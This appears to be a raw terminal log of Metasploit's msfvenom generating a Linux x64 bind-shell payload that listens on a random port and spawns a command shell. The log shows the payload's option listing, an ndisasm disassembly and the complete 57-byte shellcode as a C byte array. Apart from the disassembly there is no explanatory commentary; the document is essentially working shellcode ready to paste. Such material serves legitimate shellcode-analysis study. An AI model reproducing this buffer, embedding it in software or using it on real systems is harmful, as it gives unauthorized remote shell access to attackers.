msfvenom -p linux/x64/shell_bind_tcp_random_port  --list-options

Options for payload/linux/x64/shell_bind_tcp_random_port:
=========================


       Name: Linux Command Shell, Bind TCP Random Port Inline
     Module: payload/linux/x64/shell_bind_tcp_random_port
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 57
       Rank: Normal

Provided by:
    Geyslan G. Bem <geyslan@gmail.com>

Description:
  Listen for a connection in a random port and spawn a command shell.
  Use nmap to discover the open port: 'nmap -sS target -p-'.

msfvenom -p linux/x64/shell_bind_tcp_random_port -a x64 --platform linux -f raw | ndisasm -u -

No encoder or badchars specified, outputting raw payload
Payload size: 57 bytes

00000000  48                dec eax
00000001  31F6              xor esi,esi
00000003  48                dec eax
00000004  F7E6              mul esi
00000006  FFC6              inc esi
00000008  6A02              push byte +0x2
0000000A  5F                pop edi
0000000B  B029              mov al,0x29
0000000D  0F05              syscall
0000000F  52                push edx
00000010  5E                pop esi
00000011  50                push eax
00000012  5F                pop edi
00000013  B032              mov al,0x32
00000015  0F05              syscall
00000017  B02B              mov al,0x2b
00000019  0F05              syscall
0000001B  57                push edi
0000001C  5E                pop esi
0000001D  48                dec eax
0000001E  97                xchg eax,edi
0000001F  FFCE              dec esi
00000021  B021              mov al,0x21
00000023  0F05              syscall
00000025  75F8              jnz 0x1f
00000027  52                push edx
00000028  48                dec eax
00000029  BF2F2F6269        mov edi,0x69622f2f
0000002E  6E                outsb
0000002F  2F                das
00000030  7368              jnc 0x9a
00000032  57                push edi
00000033  54                push esp
00000034  5F                pop edi
00000035  B03B              mov al,0x3b
00000037  0F05              syscall

msfvenom -p linux/x64/shell_bind_tcp_random_port -a x64 --platform linux -f C

No encoder or badchars specified, outputting raw payload
Payload size: 57 bytes
Final size of c file: 264 bytes
unsigned char buf[] =
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
